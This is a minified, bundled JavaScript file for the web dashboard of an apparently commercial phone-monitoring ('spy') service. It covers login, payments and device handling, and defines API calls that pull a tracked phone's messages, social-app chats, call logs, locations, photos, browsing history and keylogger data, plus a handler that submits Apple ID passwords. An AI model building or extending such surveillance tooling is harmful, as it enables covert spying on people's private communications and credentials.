! function e(t, n, i) {
    function o(a, c) {
        if (!n[a]) {
            if (!t[a]) {
                var r = "function" == typeof require && require;
                if (!c && r) return r(a, !0);
                if (s) return s(a, !0);
                throw new Error("Cannot find module '" + a + "'")
            }
            var l = n[a] = {
                exports: {}
            };
            t[a][0].call(l.exports, function(e) {
                var n = t[a][1][e];
                return o(n ? n : e)
            }, l, l.exports, e, t, n, i)
        }
        return n[a].exports
    }
    for (var s = "function" == typeof require && require, a = 0; a < i.length; a++) o(i[a]);
    return o
}({
    1: [function(e, t, n) {
        "use strict";

        function i(e, t, n) {
            return t in e ? Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = n, e
        }
        var o = {
                email: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            },
            s = {
                set: function(e, t, n) {
                    n || (n = 10);
                    var i = new Date,
                        o = n;
                    i.setTime(i.getTime() + 24 * o * 3600 * 1e3);
                    var s = document.domain.split(".").slice(-2).join(".");
                    document.cookie = e + "=" + t + ";domain=" + s + ";path=/;expires=" + i.toGMTString()
                },
                get: function(e) {
                    for (var t, n = document.cookie.replace(/[ ]/g, ""), i = n.split(";"), o = 0; o < i.length; o++) {
                        var s = i[o].split("=");
                        if (e == s[0]) {
                            t = s[1];
                            break
                        }
                    }
                    return t
                },
                "delete": function(e) {
                    var t = new Date;
                    t.setTime(t.getTime() - 1e4);
                    var n = document.domain.split(".").slice(-2).join(".");
                    document.cookie = e + "=;domain=" + n + ";path=/; expires =" + t.toGMTString()
                }
            },
            a = location.pathname.indexOf("ios") > -1 ? "ios" : "android",
            c = location.pathname.match(/(\.com|\.biz|\.io)?\/([a-zA-Z\-]{1,5})\/(.*)$/),
            r = "";
        console.log(c, "match"), r = c && ["demo", "demo-ios", "control-panel", "control-panel-ios", "email"].indexOf(c[2]) === -1 ? "/" + c[2] : "";
        var l = {
                createInputDialog: function() {
                    var e = [""].join(""),
                        t = document.getElementById("dialog");
                    t ? t.innerHTML = e : document.body.append('<div id="dialog">' + e + "</div>")
                },
                checkEmail: function(e) {
                    return !!/^[\.a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/.test(e)
                },
                checkPasswd: function(e) {
                    return !!/^(?=.*?[A-Za-z])(?=.*?[0-9]).{8,}$/.test(e)
                },
                checkNotNull: function(e) {
                    return e.length > 0
                },
                getLocalTime: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "-",
                        n = new Date(e),
                        i = n.getFullYear(),
                        o = ("00" + n.getDate()).slice(-2),
                        s = ("00" + (n.getMonth() + 1)).slice(-2),
                        a = ("00" + n.getHours()).slice(-2),
                        c = ("00" + n.getMinutes()).slice(-2),
                        r = ("00" + n.getSeconds()).slice(-2);
                    return [i, s, o].join(t) + " " + [a, c, r].join(":")
                },
                getLocalTimeNew: function(e) {
                    var t, n = (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "-", new Date(e)),
                        i = n.getFullYear(),
                        o = ("0" + (n.getMonth() + 1)).slice(-2),
                        s = ("0" + n.getDate()).slice(-2),
                        a = n.getHours(),
                        c = a,
                        r = ("0" + n.getMinutes()).slice(-2),
                        l = ("0" + n.getSeconds()).slice(-2),
                        d = "AM";
                    return a > 12 ? (c = a - 12, d = "PM") : 12 === a ? (c = 12, d = "PM") : 0 == a && (c = 12), c = ("0" + c).slice(-2), t = i + "-" + o + "-" + s + " " + c + ":" + r + ":" + l + d
                },
                getQueryString: function(e) {
                    var t = new RegExp("(^|&)" + e + "=([^&]*)(&|$)", "i"),
                        n = window.location.search.substr(1).match(t);
                    return null != n ? unescape(n[2]) : null
                },
                cutNumbersAfterPoint: function(e, t) {
                    t = t || 2;
                    var n = e.toString();
                    return n = n.substring(0, n.lastIndexOf(".") + t + 1)
                },
                logout: function(e) {
                    window.userCredential = null, window.deviceList = [], window.selectDevice = null, s["delete"]("userCredential"), localStorage.clear(), setTimeout(function() {
                        e && e()
                    }, 50)
                },
                getEventTypes: function() {
                    var e = 1 * !(window.DocumentTouch && document instanceof window.DocumentTouch || "ontouchstart" in window),
                        t = {
                            start: ["touchstart", "mousedown"][e],
                            move: ["touchmove", "mousemove"][e],
                            end: ["touchend", "mouseup"][e]
                        };
                    return t
                }
            },
            d = l.getQueryString("f_pt_ch");
        if (d && s.set("origin", d, 1), !window.userCredential) {
            window.userCredential = s.get("userCredential") || "{}";
            try {
                window.userCredential = JSON.parse(window.userCredential)
            } catch (u) {
                window.userCredential = {}
            }
        }
        var p = "https://i.safespy.com/api",
            g = {
                create: function(e) {
                    var t = e.title || "",
                        n = e.detail || "",
                        i = n ? "block" : "none",
                        o = e.desc || "",
                        s = o ? "block" : "none",
                        a = e.failure ? "none" : "block",
                        c = e.failure ? "block" : "none",
                        r = function() {
                            $("#success-alert").remove(), e.cancel && e.cancel()
                        },
                        l = function() {
                            $("#success-alert").remove()
                        },
                        d = function() {
                            $("#success-alert").remove(), e.confirm && e.confirm()
                        },
                        u = e.needCancel ? '<a href="javascript:;" class="w-btn cancel-btn ">Cancel</a>' : "",
                        p = e.noClose ? "" : '<i class="iconfont icon-ListClear close-btn"></i>',
                        g = '\n\t\t  <div class="alert-wrap" id="success-alert">\n\t\t\t<div class="alert">\n\t\t\t  <div class="alert-cont">\n\t\t\t    <div class="alert-header">\n\t\t\t      ' + p + '\n\t\t\t    </div>\n\t\t\t    <div class="alert-body">\n\t\t\t      <div class="alert-item">\n\t\t\t          <div class="alert-item-icon">\n\t\t\t            <i class="iconfont icon-finish" style="display: ' + a + '"></i>\n\t\t\t            <i class="iconfont" style="display: ' + c + '">⚠️</i>\n\t\t\t          </div>\n\t\t\t          <div class="alert-item-cont">\n\t\t\t            <div class="alert-title">' + t + '</div>\n\t\t\t            <p class="dec-center" style="display: ' + i + '">' + n + '</p>\n\t\t\t            <p class="deepblue-text" style="display: ' + s + '">' + o + '</p>\n\t\t\t            <div class="btn-wrapper">\n\t\t\t\t\t\t\t' + u + ',\n\t\t\t              <a href="javascript:;" class="a-btn confirm-btn">OK</a>\n\t\t\t            </div>\n\t\t\t          </div>\n\t\t\t      </div>\n\t\t\t    </div>\n\t\t\t  </div>\n\t\t\t</div>\n\t\t\t</div>\n\t\t';
                    $("#success-alert").length && $("#success-alert").remove(), $("body").append(g), $("body").on("click", ".close-btn", l), $("body").on("click", ".cancel-btn", r), $("body").on("click", ".confirm-btn", d)
                }
            },
            f = {
                start: -1,
                status: !1,
                create: function(e) {
                    this.status = !0;
                    var t = '\n\t\t<div class="loading-wrap" id="loading">\n\t\t\t<div class="loadding">\n\t\t\t    <div class="loading-circle Rotation">\n\n\t\t\t\t</div>\n\t\t\t\t<div class="loading-icon"></div>\n\t\t\t</div>\n\t\t</div>\n\n\t\t';
                    this.start = Date.now(), $("#loading").length ? $("#loading").show() : $("body").append(t)
                },
                close: function() {
                    this.status = !1;
                    Math.max(0, 2e3 - (Date.now() - this.start));
                    $("#loading").hide()
                }
            },
            _ = {
                host: p,
                post: function(e, t, n) {
                    var i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                    i = i || {};
                    var o = {};
                    return o = location.pathname.indexOf("demo") > -1 ? {
                        uid: -1,
                        token: "",
                        client_type: 1,
                        client_id: a + "_demo",
                        os_type: "android" == a ? 0 : 1,
                        version: "1"
                    } : {
                        uid: userCredential.uid || -1,
                        token: userCredential.token,
                        client_type: 1,
                        channel: d || s.get("origin"),
                        os_type: (window.selectDevice ? window.selectDevice.os_type : "android" === a ? 0 : 1) || 0,
                        client_id: window.selectDevice && selectDevice.device_id || "android_demo",
                        version: "1"
                    }, $.post({
                        url: _.host + e,
                        dataType: "json",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        data: JSON.stringify({
                            head: o,
                            data: t
                        }),
                        method: "POST",
                        success: function(o) {
                            if (console.log(e + "请求响应：", JSON.stringify(o)), o.meta && 0 === o.meta.code) n && n(o);
                            else if (100 === o.meta.code) localStorage.clear(), s["delete"]("userCredential"), window.userCredential = {}, window.selectDevice = {}, window.deviceList = [], setTimeout(function() {
                                _.post(e, t, n)
                            }, 2e3);
                            else {
                                var a = o.meta && o.meta.message;
                                if (i.withoutDialog) console.log("不提示出错信息....."), n && n(o);
                                else {
                                    var a = o.meta && o.meta.message;
                                    g.create({
                                        failure: !0,
                                        title: a
                                    }), n && n(o)
                                }
                            }
                        }
                    })
                },
                signIn: function(e, t, n) {
                    _.post("/user/signin", {
                        username: e,
                        password: t
                    }, n)
                },
                signUp: function(e, t, n) {
                    _.post("/user/signup", {
                        username: e,
                        password: t
                    }, function(i) {
                        0 == i.meta.code ? _.signIn(e, t, function(e) {
                            window.userCredential = {
                                uid: e.data.uid,
                                token: e.data.token
                            }, s.set("userCredential", JSON.stringify(window.userCredential)), localStorage.clear(), window.selectDevice = {}, window.deviceList = [], _.getUserInfo(function(e) {
                                0 === e.meta.code && (window.userInfo = e.data, _.getDeviceList(function(t) {
                                    0 == t.meta.code && (window.deviceList = t.data.items, localStorage.setItem("deviceList", JSON.stringify(t.data.items)), n && n(e))
                                }))
                            })
                        }) : (f.close(), $("#commonErrorInfo").html(i.meta.message).show())
                    })
                },
                repairPassword: function(e, t, n, i) {
                    _.post("/user/repair_password", {
                        username: e,
                        password_code: t,
                        new_password: n
                    }, i)
                },
                forgetPassword: function(e, t) {
                    _.post("/user/forget_password", {
                        username: e
                    }, t)
                },
                checkIcloudPassword: function(e, t, n) {
                    _.post("/icloud/device_list", {
                        apple_id: e,
                        password: t
                    }, n)
                },
                chouseIcloudDevice: function(e, t) {
                    _.post("/icloud/choose", {
                        device: e
                    }, t)
                },
                getNotifications: function(e, t, n, i, o, s) {
                    _.post("/notification/get_list", {
                        page_num: e,
                        page_size: t,
                        package_name: n,
                        start_time: i,
                        end_time: o
                    }, s)
                },
                updateIcloudPassword: function(e, t, n) {
                    _.post("/icloud/update_password", {
                        apple_id: e,
                        new_password: t
                    }, n)
                },
                getDeviceList: function(e) {
                    _.post("/device_info/list", {}, e)
                },
                getApplicationList: function(e, t, n) {
                    _.post("/application/get_list", {
                        page_num: e,
                        page_size: t
                    }, n)
                },
                getScore: function(e) {
                    _.post("/website_score/get", {}, e)
                },
                getActivityInfo: function(e) {
                    _.post("/activities/summary", {}, e)
                },
                addScore: function(e, t) {
                    _.post("/website_score/add", {
                        score: e
                    }, t)
                },
                getMessageList: function(e, t, n) {
                    _.post("/sms_info/get_thread_list", {
                        page_num: e,
                        page_size: t
                    }, n)
                },
                getiMessageList: function(e, t, n) {
                    _.post("/imessage/get_thread_list", {
                        page_num: e,
                        page_size: t
                    }, n)
                },
                getSocialList: function(e, t, n, i) {
                    _.post("/" + e + "/get_thread_list", {
                        page_num: t,
                        page_size: n
                    }, i)
                },
                getLocation: function(e) {
                    _.post("/device_info/latest_info", {}, e)
                },
                getDeviceConfig: function(e) {
                    _.post("/device_setting/get", {}, e)
                },
                setDeviceConfig: function(e, t) {
                    _.post("/device_setting/update", {
                        total_on: e.total_on,
                        update_interval: e.update_interval,
                        location_on: e.location_on,
                        address_book_on: e.address_book_on,
                        browser_bookmards_on: e.browser_bookmards_on,
                        videos_on: e.videos_on,
                        viber_on: e.viber_on,
                        snapchat_on: e.snapchat_on,
                        line_on: e.line_on,
                        tinder_on: e.tinder_on,
                        location_update_interval: e.location_update_interval,
                        sms_on: e.sms_on,
                        events_on: e.events_on,
                        installed_apps_on: e.installed_apps_on,
                        skype_on: e.skype_on,
                        facebook_on: e.facebook_on,
                        instagram_on: e.instagram_on,
                        telegram_on: e.telegram_on,
                        hangouts_on: e.hangouts_on,
                        call_logs_on: e.call_logs_on,
                        emails_on: e.emails_on,
                        photos_on: e.photos_on,
                        whatsapp_on: e.whatsapp_on,
                        keylogger_on: e.keylogger_on,
                        wifi_networks_on: e.wifi_networks_on,
                        wechat_on: e.wechat_on,
                        keywords_on: e.keywords_on,
                        units: e.units,
                        update_time: e.update_time
                    }, t)
                },
                getPictureList: function(e, t, n, i, o) {
                    _.post("/picture/get_list", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i
                    }, o)
                },
                getVideoList: function(e, t, n, i, o) {
                    _.post("/video/get_list", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i
                    }, o)
                },
                getLocationList: function(e, t, n, i, o) {
                    _.post("/location/get_list", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i
                    }, o)
                },
                getContactList: function(e, t, n) {
                    _.post("/contact/get_list", {
                        page_num: e,
                        page_size: t
                    }, n)
                },
                getSubscriptionStatus: function(e) {
                    return _.post("/user/get_subscription", {}, e)
                },
                getUserInfo: function(e) {
                    _.post("/user/get_user_info", {}, e)
                },
                getPayInfo: function(e, t, n) {
                    _.post("/paypal/payment_info", {
                        pay_id: e
                    }, t, n)
                },
                getDiscountInfo: function(e, t) {
                    _.post("/product/promote", {
                        uuid: e
                    }, t)
                },
                changePassword: function(e, t, n, i) {
                    console.log(e, "-------"), _.post("/user/change_password", {
                        username: e,
                        old_password: t,
                        new_password: n
                    }, i)
                },
                getMessageByThread: function(e, t, n, i) {
                    _.post("/sms_info/get_thread_content", {
                        thread_id: e,
                        page_num: t,
                        page_size: n
                    }, i)
                },
                getiMessageByThread: function(e, t, n, i) {
                    _.post("/imessage/get_thread_content", {
                        contact: e,
                        page_num: t,
                        page_size: n
                    }, i)
                },
                getSocialByThread: function(e, t, n, o, s, a) {
                    var c;
                    _.post("/" + e + "/get_thread_content", (c = {}, i(c, t, n), i(c, "page_num", o), i(c, "page_size", s), c), a)
                },
                getCallData: function(e, t, n, i, o, s, a) {
                    _.post("/call_log/get_list", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i,
                        keyword: o,
                        orderby: s
                    }, a)
                },
                getHistoryData: function(e, t, n, i, o, s, a) {
                    _.post("/browser_info/get_list", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i,
                        keyword: o,
                        orderby: s
                    }, a)
                },
                getCalendarsData: function(e, t, n) {
                    _.post("/calendar/get_list", {
                        page_num: e,
                        page_size: t
                    }, n)
                },
                createStripePayOrder: function(e, t) {
                    return console.log(e), _.post("/stripe/checkout", e, t)
                },
                createPayOrder: function(e, t) {
                    return console.log("goods_id======" + e), _.post("/paypal/create_payment", {
                        goods_id: e
                    }, t)
                },
                executePay: function(e, t) {
                    return _.post("/paypal/execute_payment", {
                        pay_id: e,
                        payer_id: t
                    })
                },
                getAppDownload: function(e) {
                    return _.post("/apk/get_android_link", {}, e)
                },
                getSimcardInfo: function(e) {
                    return _.post("/sim_card/get_info", {}, e)
                },
                verifySimcardEmail: function(e, t) {
                    return _.post("/sim_card/verify_email", {
                        code: e
                    }, t)
                },
                sendSimcardCode: function(e) {
                    return _.post("/sim_card/send_code", {}, e)
                },
                addSimcardEmail: function(e, t) {
                    return _.post("/sim_card/update_email", {
                        email: e
                    }, t)
                },
                refreshData: function(e) {
                    return _.post("/device_info/refresh_data", {}, e)
                },
                getKeyloggerData: function(e) {
                    return _.post("/keylogger/get_package_list", {}, e)
                },
                getKeyloggerContent: function(e, t, n, i, o, s) {
                    return _.post("/keylogger/get_package_content", {
                        page_num: e,
                        page_size: t,
                        start_time: n,
                        end_time: i,
                        package_name: o
                    }, s)
                }
            },
            m = {
                transferLanguage: function(e) {
                    console.log("语言跳转:" + e);
                    var t = !r;
                    if (t)
                        if ("en" != e)
                            if (/\.html/.test(location.href)) {
                                var n = location.pathname.replace(/^\/(spy)?\//, "$1" + e + "/");
                                location.href = n
                            } else location.href = location.href.replace(/\/$/, "") + "/" + e + "/";
                    else $("#language-select").dropdown("toggle");
                    else if ("en" == e) {
                        var i = location.pathname.replace(/^(\/(spy)?)\w{2}\//, "$1");
                        location.href = i
                    } else {
                        var o = location.pathname.replace(/^(\/(spy)?)(\w{2}\/)/, "$1" + e + "/");
                        location.href = o
                    }
                }
            },
            v = {
                deviceRefurbish: function(e) {
                    $(".btn_sync").on("click", function(e) {
                        $(".btn_sync").addClass("rotate-infinite"), $(".text_sync").show(), $(".text_sync_time").hide(), v.getDeviceList();
                        var t = new Date,
                            n = t.toDateString().replace(/^[^\s]+\s+/, ""),
                            t = t.toTimeString().replace(/\s+.*$/, "");
                        $("#sync_time").html(n + " " + t), _.refreshData(function(e) {})
                    })
                },
                changeSelectDevice: function(e) {
                    if (!window.deviceList.length) return console.log("没有设备...."), !1;
                    var t = +e.attr("index");
                    window.selectDevice = window.deviceList[t], window.localStorage.setItem("selectDevice", window.selectDevice.device_id), e.children("a").addClass("active"), e.siblings().children("a").removeClass("active"), $("#asideMenu").slideDown(), $("#deviceBox").slideUp(), $("#select-device").html(window.selectDevice.phone_model)
                },
                getDeviceList: function(e) {
                    var t = this;
                    console.log("开始获取设备列表"), _.getUserInfo(function(n) {
                        window.userInfo = n.data, _.getDeviceList(function(n) {
                            if (console.log("设备列表获取成功", n), 0 === n.meta.code) {
                                window.deviceList = n.data.items || [], console.log("已选择设备:", window.selectDevice);
                                var i = localStorage.getItem("selectDevice");
                                i ? window.selectDevice = window.deviceList.find(function(e) {
                                    return e.device_id === i
                                }) : window.selectDevice = window.deviceList[0];
                                var o = $("#no-device-bound-tpl").html(),
                                    s = $("#no-device-tpl").html();
                                window.selectDevice && localStorage.setItem("selectDevice", window.selectDevice.device_id), window.selectDevice = window.selectDevice || {
                                    device_id: o,
                                    os_version: "——",
                                    phone_model: s
                                }, t.setDeviceList(), $(".btn_sync").removeClass("rotate-infinite"), $(".text_sync").hide(), $(".text_sync_time").show(), e && e(n)
                            }
                        })
                    })
                },
                getUserInfo: function(e) {
                    _.getUserInfo(function(t) {
                        console.log("获取用户信息成功"), 0 === t.meta.code ? (window.userInfo = t.data, localStorage.setItem("userInfo", JSON.stringify(t.data)), $(".userName").html(t.data.username), e && e(t)) : window.userInfo = null
                    })
                },
                setDeviceList: function() {
                    var e = "";
                    if (window.deviceList = window.deviceList.filter(function(e) {
                            return "android" === a ? 0 === e.os_type : 0 !== e.os_type
                        }), window.selectDevice && selectDevice.id) {
                        var t = window.deviceList.filter(function(e) {
                            return e.id === selectDevice.id
                        });
                        t.length || (window.selectDevice = {})
                    }
                    var e = "";
                    if (window.deviceList.length) {
                        for (var n = 0, i = deviceList.length; n < i; n++) {
                            var o = deviceList[n].id === (window.selectDevice && selectDevice.id ? "active" : "");
                            e += '\n                    <li class="device-info " index="' + n + '">\n                        <a href="javascript:;" class="' + o + '">\n                            <span class="img-wrapper icon-device"></span>\n                            <span class="text eps">' + deviceList[n].phone_model + "-" + (deviceList[n].device_id || "").slice(-4) + "</span> \n                        </a>\n                    </li>\n                "
                        }
                        window.selectDevice && selectDevice.id || (window.selectDevice = deviceList[0])
                    }
                    var s = $("#add-new-device-tpl").html(),
                        c = location.pathname.indexOf("control-panel") > -1;
                    if (c && (console.log("Controlpanel下，检测是否需要插入添加设备....."), window.userInfo)) {
                        var l = window.userInfo.member_info,
                            d = {
                                0: 0,
                                1: 1,
                                2: 1,
                                3: 3
                            },
                            u = {
                                0: 0,
                                1001: 1,
                                1002: 5,
                                1003: 25
                            };
                        "android" == a && l.member_type && 1e3 * l.member_end_time > Date.now() ? (console.log("Android平台，会员未过期", l.binded_device_num, d[l.member_type]), l.binded_device_num < d[l.member_type] && (console.log("尚可添加新设备！"), e += '<li id="add-new-device"><a href="https://i.safespy.com' + r + '/control-panel/wizard1.html"><span class="img-wrapper icon-device"></span><span class="text eps">' + s + "</span></a></li>")) : "ios" == a && l.icloud_member_type && 1e3 * l.icloud_end_time > Date.now() && (console.log("iOS平台，会员尚未过期！", l.icloud_device_num, u[l.icloud_member_type]), l.icloud_device_num < u[l.icloud_member_type] && (console.log("尚可绑定新设备！"), e += '<li id="add-new-device"><a href="https://i.safespy.com' + r + '/control-panel-ios/wizard1.html"><span class="img-wrapper icon-device"></span><span class="text eps">' + s + "</span></a></li>"))
                    }
                    e && $("#deviceBox").html(e), window.selectDevice && selectDevice.id ? $("#select-device").html(selectDevice.phone_model) : $("#select-device").html($("#nodevice-tpl").html())
                },
                setCoverLayer: function(e) {
                    var t = $('\n\t      <a href="' + e.href + '" class="covering-layer" target="_blank" style="height:' + e.height + "px;width:" + (e.width || "100%") + ';">\n\t          <div class="covering-layer-wrap">\n\t\t          <img src="https://safespy.com/assets/demo/lock.png" style="display: ' + (e.small ? "none" : "block") + '" alt="">\n\t\t          <p class="desc">' + e.desc + '</p>\n\t\t          <p class="tips" style="display: ' + (e.small ? "none" : "block") + '">\n\t\t              With your current plan you are allowed to see only ' + e.limit + ' results. Please upgrade to a higher plan if you need to see more.\n\t\t          </p>\n\t\t          <div class="upgrade-wrap">\n\t\t              <span class="a-btn" id="upgrade-now">UPGRADE NOW</span>                    \n\t\t          </div> \n\t          </div>\n\t      </a>\n\t      '),
                        n = e.wrapper.children(".covering-layer");
                    n.length ? n.replaceWith(t) : e.wrapper.css({
                        position: "relative"
                    }).append(t)
                }
            },
            w = function(e, t) {
                for (var n = /<%([^%>]+)?%>/g, i = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g, o = "var r=[];\n", s = 0, a = function r(e, t) {
                        return o += t ? e.match(i) ? e + "\n" : "r.push(" + e + ");\n" : "" != e ? 'r.push("' + e.replace(/"/g, '\\"') + '");\n' : "", r
                    }; c = n.exec(e);) a(e.slice(s, c.index))(c[1], !0), s = c.index + c[0].length;
                return a(e.substr(s, e.length - s)), o += 'return r.join("");', new Function(o.replace(/[\r\t\n]/g, "")).apply(t)
            },
            h = function() {
                var e = {};
                return function(t, n) {
                    var i = e[t];
                    return i || (i = new Function("obj", "var p=[];with(obj){p.push('" + t.replace(/[\r\t\n]/g, " ").split("<%").join("\t").replace(/((^|%>)[^\t]*)'/g, "$1\r").replace(/\t=(.*?)%>/g, "',$1,'").split("\t").join("');").split("%>").join("p.push('").split("\r").join("\\'") + "');}return p.join('');"), e[t] = i), i(n)
                }
            }();
        t.exports = {
            util: l,
            api: _,
            cookie: s,
            uiRender: v,
            dialog: g,
            loading: f,
            platform: a,
            validator: o,
            eventBind: m,
            language: r,
            tmpl: w,
            jsTmpl: h,
            origin: d
        }
    }, {}],
    2: [function(e, t, n) {
        "use strict";
        var i = e("./common.js"),
            o = (i.util, i.api),
            s = (i.dialog, !1),
            a = {
                starClicked: -1,
                init: function() {
                    console.log("首页初始化---"), this.initScrollAnimation(), this.updateUserInfo(), $(".drop-seo-head").on("click", function() {
                        console.log("====="), $(this).parents(".drop-seo-wr").toggleClass("open")
                    })
                },
                updateUserInfo: function() {
                    var e = window.userInfo || JSON.parse(localStorage.getItem("userInfo"));
                    e && (console.log("验证userInfo是否过期"), o.getUserInfo(function(e) {
                        0 === e.meta.code ? window.userInfo = e.data : (window.userInfo = null, localStorage.removeItem("userInfo"))
                    }))
                },
                doAnimation: function(e) {
                    var t = e.querySelectorAll(".animated");
                    if (window.scrollY > 2 * e.offsetTop / 3 && window.scrollY < 3 * e.offsetTop / 4)
                        for (var n = 0; n < 3; n++) t[n].className = t[n].className + " fadeInUp";
                    if (window.scrollY > 5 * e.offsetTop / 6)
                        for (var n = 0; n < t.length; n++) t[n].className = t[n].className + " fadeInUp", s = !0
                },
                initScrollAnimation: function() {
                    s = !1;
                    var e = document.querySelector(".carousel-container");
                    e.onmousemove = function(e) {
                        console.log(e)
                    }, window.onscroll = function() {
                        var e = document.querySelector(".hp-features");
                        !s && a.doAnimation(e)
                    }
                }
            };
        a.init()
    }, {
        "./common.js": 1
    }]
}, {}, [2]);